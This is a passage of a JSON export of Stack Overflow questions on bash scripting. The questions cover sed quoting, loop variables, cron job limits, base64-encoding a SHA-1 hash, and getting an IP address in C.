href=\"http://stackoverflow.com/questions/8296649/sorting-lines-from-longest-to-shortest\">Sorting lines from longest to shortest</a>, how can I sort all of the lines in a file from shortest to longest? E.g.\"</p>\n\n<pre><code>This is a long sentence.\nThis is not so long.\nThis is not long.\n</code></pre>\n\n<p>That becomes:</p>\n\n<pre><code>This is not long.\nThis is not so long.\nThis is a long sentence.\n</code></pre>\n"},{"tags":["string","bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":12426659,"title":"How extract last part of string in bash?","body":"<p>I have variable:</p>\n\n<pre><code>A=\"Some variable has value abc.123\"\n</code></pre>\n\n<p>I need to extract this value i.e <code>abc.123</code>. Is this possible in bash?</p>\n"},{"tags":["bash","script","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12429898,"title":"Generate keymaps name list in bash","body":"<p>Ok, so... I want to generate a file with all available keymap. I could do it for locales using LC_ALL but I don't know how could I do to do this with the keymaps automatically.</p>\n\n<p>With this command I can get the proper keymap name (es.map.gz) </p>\n\n<pre><code>find /usr/share/kbd/keymaps -follow -name \"*.gz\" | sed 's|^.*/||g' | sort\n</code></pre>\n\n<p>but I wonder if there is any way to get that \"es.map.gz\" is for \"Spanish\"</p>\n\n<p>Thanks</p>\n"},{"tags":["c","bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":12361261,"title":"linux terminal hangs on bash script","body":"<p>I'm a student and this is my first exposure to bash scripting, besides messing with a simple Makefile for c.</p>\n\n<pre><code>#!/usr/bin/sh\ngcc -g -std=c99 -Wall -c field.c \ngcc -g -std=c99 -Wall -c testField.c \ngcc -g field.o testField.o -o testField \n#testField get 0xa 0 1 &gt; PA1output.txt \n#testField get 0xaa 0 3 &gt;&gt; PA1output.txt\n</code></pre>\n\n<p>is my script.I want to compile field.c and testField.c into the executable testField.\nNo matter if I leave the last 2 lines commented out or not, they linux terminal hangs and after 10 seconds of nothing happening I press ctrl+c to stop it. Ultimately I want to redirect output to PA1output.txt, then concatenate things on the end of the file, but I want to rewrite the file contents each time.</p>\n\n<p>As far as I understand it, > rewrites the contents of the specified file, and >> concatenates onto the end.</p>\n\n<p>This is not my homework, I want to automate testing of other homework I have. 'testField get 0xaa 0 3 are arguments into my c program.'</p>\n\n<p>I tried <a href=\"http://stackoverflow.com/questions/6971257/bash-script-hangs\">Bash script hangs</a>\nbut that didn't answer my question totally.</p>\n\n<p>My script is called 'as' to make it easy to type.</p>\n\n<p>Why does the terminal hang and how do I get the script to do what I described above?</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12319752,"title":"Replace a structure with a different one and preserve some values","body":"<p>I would like to transfer input to output in bash. I tried to use sed but it didn't work - I have it probably wrong. So far I have this (just to try if I can extract id) but it does not work:</p>\n\n<pre><code>sed 's;id=\"([a-zA-Z:]+)\";\\\\1;p' input\n</code></pre>\n\n<p>Input </p>\n\n<pre><code>&lt;mediaobject&gt;\n    &lt;imageobject id=\"fig:deployment\"&gt;\n        &lt;caption&gt;Application deployment&lt;/caption&gt;\n        &lt;imagedata fileref=\"images/deployment.png\" width=\"90%\" /&gt;\n    &lt;/imageobject&gt;\n&lt;/mediaobject&gt;\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>&lt;img src=\"images/deployment.png\" width=\"90%\" id=\"fig:deployment\" title=\"Application deployment\" /&gt;\n</code></pre>\n"},{"tags":["bash","for-loop","cp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12431722,"title":"Bash for loop issue with file name","body":"<p>I have a simple bash for loop and am trying to execute a command inside of it. The loop is so I can execute different file names.</p>\n\n<p>the files are:</p>\n\n<pre><code>crystal0_cmin.pdb\ncrystal1_cmin.pdb\n.\n. \n.\n</code></pre>\n\n<p>the loop is:</p>\n\n<pre><code>for ((i=0;i&lt;=10;i++))\ndo\ncp Files/crystal$i_cmin.pdb Energy/\ncp Files/crystal$i_cmin.psf Energy/\ndone\n</code></pre>\n\n<p>The problem is that I always get the following error message: </p>\n\n<pre><code>cp: cannot stat `Files/crystal.pdb': No such file or directory\ncp: cannot stat `Files/crystal.psf': No such file or directory\n</code></pre>\n\n<p>but I never specify the files crystal.pdb and crystal.psf. It just ignores the $i extension for all i. That is, none of the files get copied. </p>\n\n<p>Does anyone know how I can fix this.</p>\n\n<p>Thanks!</p>\n"},{"tags":["linux","bash","cron"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":9137193,"title":"Instance limited cron job","body":"<p>I want to run a cron job every minute that will launch a script. Simple enough there. However, I need to make sure that not more than X number (defined in the script) of instances are ever running. These are queue workers, so if at any minute interval 6 workers are still active, then I would not launch another instance. The script simply launches a PHP script which exits if no job available. Right now I have a shell script that perpetually launches itself every 10 seconds after exit... but there are long periods of time where there are no jobs, and a minute delay is fine. Eventually I would like to have two cron jobs for peak and off-peak, with different intervals.</p>\n"},{"tags":["linux","bash","script","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12431151,"title":"Call to sed works from command line but fails in script","body":"<p>I've been using the following call to <code>sed</code> to remove lines files.</p>\n\n<pre><code>sed \"/% Program:/,/mode: SPIKE/d\" file.tt &gt; file.tt.nh\n</code></pre>\n\n<p>I tried writing a bash script to allow me to run the script on many files at once. However <code>sed</code> fails.</p>\n\n<pre><code>sed \"/% Program:/,/mode: SPIKE/d\" file.tt &gt; file.tt.nh\nsed: -e expression #1, char 1: unknown command: `\"'\n</code></pre>\n\n<p>This is the script I've written that isn't working</p>\n\n<pre><code>#!/bin/bash\nSEDARG='\"/% Program:/,/mode: SPIKE/d\"';\nfor F in *.tt\ndo\n  OUT=$F'.nh';\n  echo 'sed '$SEDARG' '$F' &gt; '$OUT;\n  sed $SEDARG $F &gt; $OUT\ndone\n</code></pre>\n\n<p>What perplexes me is if I copy the echo'd string and paste it in the command line it works fine. </p>\n\n<p>Does anyone know why this script is failing but the command line call works?</p>\n"},{"tags":["php","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12431034,"title":"How to pass php array to bash script","body":"<p>My bash script call a php file</p>\n\n<pre><code>#!/bin/bash\ndata=$(./getconfig.php)\n</code></pre>\n\n<p>The file getconfig.php is:</p>\n\n<pre><code>#!/usr/bin/env php\n&lt;?php\n$array = array();\n...\n</code></pre>\n\n<p>How can I return the <code>$array</code> from the php file in order to manipulate this array in the bash script?</p>\n"},{"tags":["c","linux","bash","sockets","tcp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12423952,"title":"Different IP results for ifconfig and socket inet_ntop","body":"<p>I am developing an application on Linux. Linux executes the command:</p>\n\n<pre><code>ifconfig eth0 192.168.10.15 netmask 255.255.255.0\n</code></pre>\n\n<p>at the boot process with systemd.</p>\n\n<p>When I try to learn my ip address with ifconfig here below the result:</p>\n\n<pre><code>eth0      Link encap:Ethernet  HWaddr 00:18:31:E0:44:C6  \n          inet addr:192.168.10.15  Bcast:192.168.10.255  Mask:255.255.255.0\n          inet6 addr: fe80::218:31ff:fee0:44c6/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:24799 errors:0 dropped:1 overruns:0 frame:0\n          TX packets:13753 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:5475289 (5.2 MiB)  TX bytes:1403459 (1.3 MiB)\n</code></pre>\n\n<p>On the other hand when I try to learn my ip address via program below, I get 192.168.10.42.</p>\n\n<pre><code>void GetMyIp(char caIP[INET_ADDRSTRLEN])\n{\n  int s;\n  struct ifconf ifconf;\n  struct ifreq ifr[50];\n  int ifs;\n  int i;    \n\n  s = socket(AF_INET, SOCK_STREAM, 0);\n  if (s &lt; 0) \n  {\n      #ifdef _DEBUG_PROCESS\n        if(EDebugProcess&lt;GetDebugLevelOfPMC())\n        {\n        PrintToLogFile(\"Socket error\\n\");\n        }\n      #endif\n  }\n\n  ifconf.ifc_buf = (char *) ifr;\n  ifconf.ifc_len = sizeof ifr;\n\n  if (ioctl(s, SIOCGIFCONF, &amp;ifconf) == -1) \n  {\n    #ifdef _DEBUG_PROCESS\n        if(EDebugProcess&lt;GetDebugLevelOfPMC())\n        {\n        PrintToLogFile(\"ioctl error\\n\");\n        }\n      #endif\n  }\n\n  ifs = ifconf.ifc_len / sizeof(ifr[0]);\n    struct sockaddr_in *s_in = (struct sockaddr_in *) &amp;ifr[ifs-1].ifr_addr;\n    if (!inet_ntop(AF_INET, &amp;s_in-&gt;sin_addr, gcaMyIP, sizeof(gcaMyIP))) \n    {\n    #ifdef _DEBUG_PROCESS\n        if(EDebugProcess&lt;GetDebugLevelOfPMC())\n        {\n        PrintToLogFile(\"inet_ntop error\\n\");\n        }\n    #endif\n    }\n\n\n    close(s);\n    memcpy(caIP,gcaMyIP,INET_ADDRSTRLEN);\n}\n</code></pre>\n\n<p>What is the source of the difference?</p>\n"},{"tags":["regex","bash","unix","script","rename"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12428306,"title":"Unix CLI script to rename folders containing space","body":"<p>I have a directory with folder structure as follows:</p>\n\n<pre><code>DATA -- ABD 1231345 -- 2012_01_08\n                    -- 2012_03_09\n                    -- 2012_06_11\n\n     -- DEF 4859480 -- 2012_02_10\n                    -- 2012_05_10\n                    -- 2012_07_10\n</code></pre>\n\n<p>What I'm trying to do is:</p>\n\n<ul>\n<li><code>cd DATA</code></li>\n<li>run a bash script (while in <code>/DATA</code>) that will rename all first-child folders from</li>\n</ul>\n\n<blockquote>\n  <p>ABD 1231345</p>\n</blockquote>\n\n<p>to</p>\n\n<blockquote>\n  <p>ABD_1231345</p>\n</blockquote>\n\n<p>Do you have a suggestion on how to accomplish using command line on Mac OSX / unix?</p>\n"},{"tags":["bash","utf-8","base64","sha"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12430409,"title":"Base 64 Encoding a SHA-1 Hash in the Bash Shell","body":"<p>I have a Python command that generates the URL-safe base-64 encoding of the SHA-1 hash of a string:</p>\n\n<pre><code>&gt;&gt;&gt; import base64\n&gt;&gt;&gt; import sha\n&gt;&gt;&gt; base64.urlsafe_b64encode((sha.new(\"abc\").digest()))\n'qZk-NkcGgWq6PiVxeFDCbJzQ2J0='\n</code></pre>\n\n<p>I want to do the same thing in the bash shell, but I'm running into problems:</p>\n\n<pre><code>me:~$ echo -n \"abc\" | sha1sum | sed 's/ .*//' \na9993e364706816aba3e25717850c26c9cd0d89d\nme:~$ echo -n \"abc\" | sha1sum | sed 's/ .*//' | base64\nYTk5OTNlMzY0NzA2ODE2YWJhM2UyNTcxNzg1MGMyNmM5Y2QwZDg5ZAo=\n</code></pre>\n\n<p>I suspect that this is because of the way that sha1sum prints out (in hex format). I think base64 is reading 40 bytes, but it really should only be reading 20. I've tried piping it through iconv, but no success there:</p>\n\n<pre><code>me:~$ echo -n \"abc\" | sha1sum | sed 's/ .*//' \na9993e364706816aba3e25717850c26c9cd0d89d\nme:~$ echo -n \"abc\" | sha1sum | sed 's/ .*//' | base64\nYTk5OTNlMzY0NzA2ODE2YWJhM2UyNTcxNzg1MGMyNmM5Y2QwZDg5ZAo=\n</code></pre>\n\n<p>What should I be doing here to get the output I'm expecting?</p>\n\n<p>Thanks in advance for the help!</p>\n"},{"tags":["perl","bash","shell","unix","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12430243,"title":"How to add a string(s) after a specific string is read?","body":"<p>I want to write a script to be executed in the terminal.</p>\n\n<p>I'm editing xml files and I want to add a string or strings after the head of the xml column is detected..</p>\n\n<p>Here is a sample xml</p>\n\n<pre><code>bunch of line\nmore unimportant lines\nand they can very in number\n&lt;States&gt;\n&lt;item1&gt; something something &lt;/item1&gt;\n\n&lt;item2&gt; something something &lt;/item1&gt;\n\n&lt;item3&gt; something something &lt;/item1&gt;\n&lt;/states&gt;\n</code></pre>\n\n<p>Now I want to add an item 4. However, I want it to be inserted before item1.</p>\n\n<p>Idealy, the file would when look like: </p>\n\n<pre><code>bunch of line\nmore unimportant lines\nand they can very in number\nand even some lines were added here\nand here\nand here\n&lt;States&gt;\n&lt;item4&gt; something something &lt;/item1&gt;\n&lt;item1&gt; something something &lt;/item1&gt;\n\n&lt;item2&gt; something something &lt;/item1&gt;\n\n&lt;item3&gt; something something &lt;/item1&gt;\n&lt;/states&gt;\n</code></pre>\n\n<p>Note that there was other stuff added to the top that is irrelevent to the code. These are comments that are going to be going in.</p>\n\n<p>I am open to doing this in perl, but shell would be even better.</p>\n"},{"tags":["bash","shell","unix","parallel-processing"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":130,"score":6,"question_id":11097761,"title":"Is there a way to make bash job control quiet?","body":"<p>Bash is quite verbose when running jobs in the background:</p>\n\n<pre><code>$ echo toto&amp;\ntoto\n[1] 15922\n[1]+  Done                    echo toto\n</code></pre>\n\n<p>Since I'm trying to run jobs in parallel and use the output, I'd like to find a way to silence bash. Is there a way to remove this superfluous output?</p>\n"},{"tags":["linux","bash"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3267,"score":3,"question_id":4642191,"title":"read line by line in bash script","body":"<p>I want to do the following, read line by line of a file and use the value per line as params</p>\n\n<pre><code>FILE=\"cat test\"\necho \"$FILE\" | \\\nwhile read CMD; do\necho $CMD\ndone\n</code></pre>\n\n<p>but when I do the echo $CMD, it just returns cat :S</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12398259,"title":"Bash- Using the 'find' command for testing","body":"<p>I want to know if there's any way to use the 'find' command in bash for testing. in other words, how do I go about making a conditional statement that tests whether a file was found with 'find' or not?</p>\n\n<p>To expound more on what I mean, I've included the following code. The purpose of which should:</p>\n\n<ol>\n<li>find a directory inputted by user</li>\n<li>find a file in that directory, filename inputted by user </li>\n<li>find a word in that file, which is also inputted by user</li>\n</ol>\n\n<pre class=\"lang-sh prettyprint-override\"><code>#!/bin/bash\n#Task9.sh\ncd /\necho \"please enter a directory\"\nread direc\npath= find home -depth -name \"$direc\" \nif [ -z $path ]; then\n    echo \"not a valid directory\"\n    exit 1\nelse\n    cd $path\n    counter=3\n    while [ $counter -gt 0 ]; do\n        echo \"enter a filename\"\n        read FileName\n        FilePath= find $direc -depth -name \"$FileName\"\n        if [ -z $FilePath ]; then\n            break\n        else\n                let counter--\n    fi  \n    done\nif [ -z $FilePath ]; then \n            cd $FilePath        \n            echo \"input a word\"\n            read SearchWord\n            echo \"Found!\"\n            grep $SearchWord $FileName\n\n    else\n           echo \"No such file\"\n           exit 2\n    fi\nfi\n\nexit 0\n</code></pre>\n\n<p>I'm very new to Bash, so I apologize for any easy mistakes I have overlooked. I'm not used to parsing the language yet. Thank you to anyone who helps me, it is greatly appreciated</p>\n"},{"tags":["linux","bash","sed","bash-alias"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12427892,"title":"Auto-escaping an IP address in bash alias $argv","body":"<p>I want to set up a bash alias to grep all logs in a directory automatically; however, to make this user-friendly, I need to escape the periods and add a whitespace boundary so grep won't match too many lines.</p>\n\n<p>First I checked to be sure that I had the right syntax to escape an address...</p>\n\n<pre><code>[mpenning@sasmars daily]$ echo 1.1.1.1 | sed \"s/\\./\\\\\\\\./g\"\n1\\.1\\.1\\.1\n[mpenning@sasmars daily]$\n</code></pre>\n\n<p>Next I tried to escape a CLI argument... but it's not quite getting me there... </p>\n\n<pre><code>[mpenning@sasmars daily]$ alias tryme='echo `sed \"s/$argv[1]/\\\\\\\\./g\"`'\n[mpenning@sasmars daily]$ tryme 1.1.1.1\n</code></pre>\n\n<p>-> Indefinite hang until I hit <kbd>cntl</kbd><kbd>c</kbd></p>\n\n<p>I realize that echo isn't going to search, but this was a simple test.</p>\n\n<p>What is the simplest way to escape periods in arguments to a bash alias?</p>\n"},{"tags":["linux","bash","script"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12422369,"title":"linux appending text gives command not found","body":"<p>When I try this simple script:</p>\n\n<pre><code>#!/bin/bash\n#append csv\n\nFILES= /home/stef/test/*\n\nfor f in $FILES do\n        cat $f &gt;&gt; ~/test.txt done\n</code></pre>\n\n<p>I get following error:</p>\n\n<pre><code>./append.sh: line 4: /home/stef/test/test2.txt: Permission denied.\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"}]}
